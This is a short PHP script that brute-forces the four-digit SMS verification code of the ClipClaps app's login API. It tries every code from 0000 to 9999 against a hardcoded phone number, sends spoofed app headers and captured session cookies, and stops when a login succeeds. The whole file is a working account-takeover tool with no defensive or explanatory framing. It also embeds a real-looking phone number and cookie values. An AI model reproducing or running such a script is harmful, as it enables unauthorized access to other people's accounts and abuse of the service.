<?php
$awal = microtime(1);
$d= "0";
for ($i=$d; $i <= 9999; $i++) { 
	if (strlen($i) == 1) {
		$nomor = "000$i";
	}
	if (strlen($i) == 2) {
		$nomor = "00$i";
	}
	if (strlen($i) == 3) {
		$nomor = "0$i";
	}
	if (strlen($i) == 4) {
		$nomor = "$i";
	}
	$nope = "081357700564";
$codev = $nomor;
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.cc.clipclaps.tv/account/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"phone\":\"$nope\",\"areaCode\":\"62\",\"verifyCode\":\"$codev\"}");

$headers = array();
$headers[] = 'Charset: UTF-8';
$headers[] = 'Device-Type: 2';
$headers[] = 'Api-Version: 2';
$headers[] = 'External-Version: 1.8.2';
$headers[] = 'Device: 5.1.1';
$headers[] = 'Version: 40';
$headers[] = 'Timezone: 7';
$headers[] = 'Token: ';
$headers[] = 'Uuid: a357a412-86ad-46fe-8537-bb50ab70cfe7';
$headers[] = 'App-Id: ClipClaps_google';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Cookie: AWSALBCORS=KFfkF7haaSxu4wNDBgfJXJ/pYdn9Gocl651G4ezh93VzKKXzv/27MSYx310YaDj59XUkIxpO1sUycI/Ef6S7abU7gnnHt4QsaNwbSrKNmWidWkhuW2edt4BTXAYW;AWSALB=KFfkF7haaSxu4wNDBgfJXJ/pYdn9Gocl651G4ezh93VzKKXzv/27MSYx310YaDj59XUkIxpO1sUycI/Ef6S7abU7gnnHt4QsaNwbSrKNmWidWkhuW2edt4BTXAYW;';
$headers[] = 'Content-Type: application/json; charset=UTF-8';
$headers[] = 'Host: api.cc.clipclaps.tv';
$headers[] = 'Connection: close';
//$headers[] = 'Accept-Encoding: gzip, deflate';
$headers[] = 'User-Agent: okhttp/4.2.1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
//curl_setopt($ch, CURLOPT_PROXY, "192.168.42.129:9999");
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}else
{
	$data = json_decode($result, true);
	if ($data['code'] == 1) {
		echo "Login Berhasil => $codev\n";
		break;
	}else
	{
		echo "Gagal Login => $codev\n";
	}
}
curl_close($ch);
}
$akhir = microtime(1);
echo "waktu =>".$akhir-$awal." \n";